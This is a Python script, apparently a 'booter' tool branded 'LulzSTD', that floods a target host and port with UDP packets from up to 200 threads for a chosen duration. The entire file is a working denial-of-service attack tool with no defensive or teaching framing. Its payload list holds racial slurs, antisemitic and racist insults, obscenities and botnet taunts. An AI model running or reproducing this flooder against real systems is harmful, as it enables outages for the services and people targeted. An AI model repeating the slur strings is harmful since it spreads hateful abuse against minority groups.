import socket, threading, sys, os, time
from random import choice

strings = [
    'std rules',
    'lulz flood!!!',
    'lulz api!!!!',
    'lulz std!!!'
    'jews',
    'get rekt m8',
    '420 mgl doritoz',
    'big b00ter',
    'pwned',
    'looks like they cant handle the neutron style',
    'fuckthefeds',
    'you don\'t got anything on me!',
    'i got hella booterz',
    'booters connected to my boatnet',
    'brian krebs is sexy',
    'sub to w3w3w3',
    'go buy a spot on nato bot',
    'Моямошонкачешетсялмао', # My scrotum itches lmao
    'Хуй', # penis
    'black people with white dicks 2022',
    'get pwned nigga',
    'lulz',
    'std flood bitch!',
    'dts',
    'cancer',
    'acab',
    'we do it for the lulz',
    'ayyy lmao',
    'fatphobia is a joke',
    'xo2wlpcMkwB7xl1roInS',
    'eYrwUkiMOGKfqtxF9PiQ',
    '9tGesp1yxlAafHykBlOH',
    'Zq14AOASOqGQsQKGuMVU',
    'olunvWs1U9D9Fj5Lfq80',
    'e1jJUqXQLa8sAGNOyK3a',
    'lzZbJv3MWrO7OMLDtvCD',
    'YvzVL6pVVphQBTdu23rY',
    'jy7vd6Gt6lQ2JeGccXnR',
    'q78J1jWEllMW4ORH9RrM',
    'ItpgKX7deAoof12A6ock',
    'OLMH5ke9LHyA587NewSO',
    'xk8pBuHXVZa2FwkmlbfW',
    'D3azFwP67HVehxHxn0Gv',
    '7c6dJZkkF53MtJQ40iRF',
    'yPshYIcbBvVyKMRy5pyZ',
    '53fDEesj58E2o25RIpOZ',
    'DiglluqLJvvLxGv5Bgv5',
    'zSLyeTSFrqtQJvBw5U8h',
    '2ihxJ2ZaLPz8ne2XLSMg',
    '89lOPjJju1Vk5Sn8zPoE',
    'rjOHaPss80ZDV2hQJzjU',
    'NYxDUzdCpeB35l8iswB8',
    'fH8wO63UUyMSMW5b3Oy5',
    'FiRCccq6WR0IXTkpMIJt',
    'oDU51LlaAHndskX7xyMf',
    'ICoLF8Up6T62vP7LNHVP',
    'jglGykcOrU5ObTez3kJY',
    'cgJCzPA2vcABPHxRIG6M',
    'Vu22WV6aFZblTwiEW4pg',
    '7tQrRiFKcWCKIgVoXCaM',
    'WFgMvfpzXkmUi5ThciSO',
    '5Azcj6qqebiq8Lmwmzw6',
    'A70gmCojDzqbcCm0BYQc',
    'CH5HFi8ujerugdMOtJFh',
    'tdJLBxUA8i8St0X4QH53',
    'Pt5j3eMFZLkiQx5gqRin',
    'iRCzWAibQCxeFtBqABWP',
    'kasi00QZxgZfgTqIoTxr',
    'N9zGRHQ6c8fy9a1CO8PK',
    'VXDMdbu32a6ApNW3txh6',
    'oBWTLW7qt37YwhRV6UNo',
    'Xmz2mdlVjPuRiHhRWWcM',
    '3lRaHR7rR1QHJHkHI3Ck',
    'PozHlpiND4xPDPuGE6tq',
    'tg57YSAcuvy2hdBlEWMv',
    'VaDp3Vu5m5bKcfCU96RX',
    'UBWcPjIZOdZ9IAOSZAy6',
    'JezacHw4VfzRWzsglZlF',
    '3zOWSvAY2dn9rKZZOfkJ',
    'oqogARpMjAvdjr9Qsrqj',
    'yQAkUvZFjxExI3WbDp2g',
    '35arWHE38SmV9qbaEDzZ',
    'kKbPlhAwlxxnyfM3LaL0',
    'a7pInUoLgx1CPFlGB5JF',
    'yFnlmG7bqbW682p7Bzey',
    'S1mQMZYF6uLzzkiULnGF',
    'jKdmCH3hamvbN7ZvzkNA',
    'bOAFqQfhvMFEf9jEZ89M',
    'VckeqgSPaAA5jHdoFpCC',
    'CwT01MAGqrgYRStHcV0X',
    '72qeggInemBIQ5uJc1jQ',
    'zwcfbtGDTDBWImROXhdn',
    'w70uUC1UJYZoPENznHXB',
    'EoXLAf1xXR7j4XSs0JTm',
    'lgKjMnqBZFEvPJKpRmMj',
    'lSvZgNzxkUyChyxw1nSr',
    'VQz4cDTxV8RRrgn00toF',
    'YakuzaBotnet',
    'Scarface1337'
]

def flood():
    host = sys.argv[2]
    port = sys.argv[3]
    duration = sys.argv[4]

    stoptime = time.time() + int(duration)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2)

    while time.time() < stoptime:
        try:
            sock.sendto(choice(strings).encode(), (host, int(port)))
        except KeyboardInterrupt:
            os.kill(os.getpid(), 9)
        except Exception:
            pass
    
    sock.close()

if __name__ == '__main__':
    print('''
             /$$                 /$$            /$$$$$$  /$$$$$$$$ /$$$$$$$ 
            | $$                | $$           /$$__  $$|__  $$__/| $$__  $$
            | $$       /$$   /$$| $$ /$$$$$$$$| $$  \__/   | $$   | $$  \ $$
            | $$      | $$  | $$| $$|____ /$$/|  $$$$$$    | $$   | $$  | $$
            | $$      | $$  | $$| $$   /$$$$/  \____  $$   | $$   | $$  | $$
            | $$      | $$  | $$| $$  /$$__/   /$$  \ $$   | $$   | $$  | $$
            | $$$$$$$$|  $$$$$$/| $$ /$$$$$$$$|  $$$$$$/   | $$   | $$$$$$$/
            |________/ \______/ |__/|________/ \______/    |__/   |_______/
    ''')
    
    try:
        threadcount = 200 if int(sys.argv[1]) > 200 else int(sys.argv[1])

        for _ in range(threadcount):
            threading.Thread(target=flood).start()
    except:
        print('error')